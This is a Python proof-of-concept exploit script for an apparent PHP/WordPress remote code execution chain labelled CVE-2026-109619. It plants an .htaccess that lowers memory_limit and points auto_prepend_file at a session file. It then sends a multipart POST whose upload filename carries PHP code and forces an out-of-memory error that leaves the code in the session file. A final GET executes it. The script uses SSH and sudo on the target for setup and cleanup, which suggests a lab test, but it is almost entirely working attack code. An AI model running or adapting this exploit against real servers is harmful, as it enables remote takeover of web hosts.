#!/usr/bin/env python3
"""
CVE-2026-109619 → HTTP RCE  (against DEFAULT php.ini)
Target: PHP 8.x + WordPress (stock default php.ini)

PHP is running with stock defaults:
  memory_limit=128M  post_max_size=8M  use_only_cookies=1

But Apache has AllowOverride All (required by WordPress for permalinks).
A single .htaccess overrides php_value to enable the OOM window AND
the auto_prepend_file inclusion — all in one file.

Chain
─────
  .htaccess sets: memory_limit=8M, post_max_size=256M,
                  auto_prepend_file → session file
  1. Producer POST: multipart with PHP code in filename + 12 MB body
     → .htaccess lowers memory_limit → OOM → session preserved
     → auto_prepend target doesn't exist yet → E_WARNING, harmless
  2. Trigger GET:  auto_prepend now finds the session file → includes it
     → PHP parser hits <?php tag inside serialised data → executes → RCE

Setup : 1 file  .htaccess  (created before exploit, removed after)
"""
import os, socket, subprocess, sys, threading, time

HOST = os.environ.get("TARGET_HOST", "127.0.0.1")
PORT = int(os.environ.get("TARGET_PORT", "80"))
SID  = "rce002"
SESS = f"/var/lib/php/sessions/sess_{SID}"
CMD  = "id"
PHP  = f"<?php system('{CMD}');die(); ?>"

HTACCESS = f"""\
php_value memory_limit 8M
php_value post_max_size 256M
php_value auto_prepend_file {SESS}
"""

SSH_USER = os.environ.get("SSH_USER", "user")
SSH_PASS = os.environ.get("SSH_PASS", "pass")

def ssh(cmd, timeout=30):
    r = subprocess.run(
        ["sshpass", "-p", SSH_PASS, "ssh",
         "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=10",
         f"{SSH_USER}@{HOST}", cmd],
        capture_output=True, text=True, timeout=timeout)
    return r.stdout + r.stderr

def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"] if isinstance(p["name"], bytes) else p["name"].encode()
        dt = p["data"] if isinstance(p["data"], bytes) else p["data"].encode()
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"] if isinstance(p["filename"], bytes) else p["filename"].encode()
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)

def http_req(method, path, body=None, bnd=None, timeout=120):
    if body:
        hdr = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    else:
        hdr = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {HOST}:{PORT}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
    sock = socket.create_connection((HOST, PORT), timeout=timeout)
    sock.settimeout(timeout)
    data = bytearray()
    def rx():
        try:
            while True:
                c = sock.recv(65536)
                if not c:
                    break
                data.extend(c)
        except Exception:
            pass
    t = threading.Thread(target=rx, daemon=True)
    t.start()
    try:
        sock.sendall(hdr)
        if body:
            for off in range(0, len(body), 262144):
                sock.sendall(body[off:off + 262144])
    except Exception:
        pass
    t.join(timeout=timeout + 1)
    sock.close()
    return bytes(data)

def resp_body(raw):
    return raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else raw

def resp_status(raw):
    return raw.split(b"\r\n", 1)[0].decode("latin1") if raw else "(empty)"

# ════════════════════════════════════════════════════════════
print("=" * 62)
print("CVE-2026-109619  HTTP → RCE   (default php.ini)")
print(f"Target {HOST}:{PORT}   CMD: {CMD}")
print("=" * 62)

# ── 0  verify php.ini is default ───────────────────────────
print("\n[0] verify php.ini is stock default …")
ini = ssh("cat /opt/php-8.4.26/etc/php.ini 2>/dev/null").strip()
print(f"    php.ini: {ini}")
ml = ssh("curl -s http://localhost/ok.php -o /dev/null; /opt/php-8.4.26/bin/php -r 'echo ini_get(\"memory_limit\");' 2>/dev/null").strip()

# clean state
ssh(f"echo {SSH_PASS} | sudo -S systemctl restart apache2 2>/dev/null")
time.sleep(2)
ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/lib/php/sessions/sess_* 2>/dev/null")
ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
print("    apache restarted, sessions cleaned")

# ── 1  create .htaccess (the ONLY file) ───────────────────
print(f"\n[1] create .htaccess (overrides php_value via AllowOverride All)")
# Write to /tmp first, then sudo cp
ssh(f"cat > /tmp/_ht << 'EOF'\n{HTACCESS}EOF")
ssh(f"echo {SSH_PASS} | sudo -S cp /tmp/_ht /var/www/html/.htaccess && rm /tmp/_ht")
verify = ssh(f"cat /var/www/html/.htaccess 2>/dev/null").strip()
for line in verify.split("\n"):
    print(f"    {line}")

# ── 2  producer OOM ────────────────────────────────────────
print(f"\n[2] producer OOM   SID={SID}")
print(f"    filename = {PHP}")
body = multipart([
    {"name": "PHPSESSID",                   "data": SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS",  "data": "pwn"},
    {"name": "f", "filename": PHP,           "data": b"A" * 64},
    {"name": "big",                          "data": b"B" * (12 * 1024 * 1024)},
], b"BOOM")
print(f"    sending {len(body)} bytes …")
r1 = http_req("POST", "/ok.php", body, b"BOOM", timeout=120)
print(f"    {resp_status(r1)}")
time.sleep(0.5)

# ── 3  verify session file ─────────────────────────────────
print(f"\n[3] check session file …")
raw = ssh(f"echo {SSH_PASS} | sudo -S cat {SESS} 2>/dev/null")
size = ssh(f"echo {SSH_PASS} | sudo -S stat -c%s {SESS} 2>/dev/null").strip()
print(f"    size = {size} bytes")
if "<?php" in raw:
    i = raw.find("<?php")
    snippet = raw[max(0, i - 20):i + len(PHP) + 5]
    print(f"    ✓ PHP code at offset {i}: …{snippet}…")
else:
    print(f"    ✗ no PHP code — session file content:")
    print(f"      {raw[:300]}")
    # cleanup before exit
    ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
    sys.exit(1)

# ── 4  trigger RCE ─────────────────────────────────────────
print(f"\n[4] trigger: GET /ok.php")
r2 = http_req("GET", "/ok.php", timeout=10)
out = resp_body(r2).decode("latin1", errors="replace")

# ── 5  cleanup ─────────────────────────────────────────────
print(f"\n[5] cleanup …")
ssh(f"echo {SSH_PASS} | sudo -S rm -f /var/www/html/.htaccess 2>/dev/null")
ssh(f"echo {SSH_PASS} | sudo -S rm -f {SESS} 2>/dev/null")
print("    .htaccess + session removed")

# ── result ─────────────────────────────────────────────────
print("\n" + "=" * 62)
if "uid=" in out:
    idx = out.index("uid=")
    end = out.find("\n", idx)
    line = out[idx:end].strip() if end > 0 else out[idx:idx + 80].strip()
    print(f"  ★  RCE confirmed: {line}")
    print(f"  ★  php.ini = stock default, .htaccess did all the work")
elif out.strip():
    print(f"  ?  response ({len(out)} chars):")
    print(f"     {out[:500]}")
else:
    print("  ✗  empty response")
print("=" * 62)
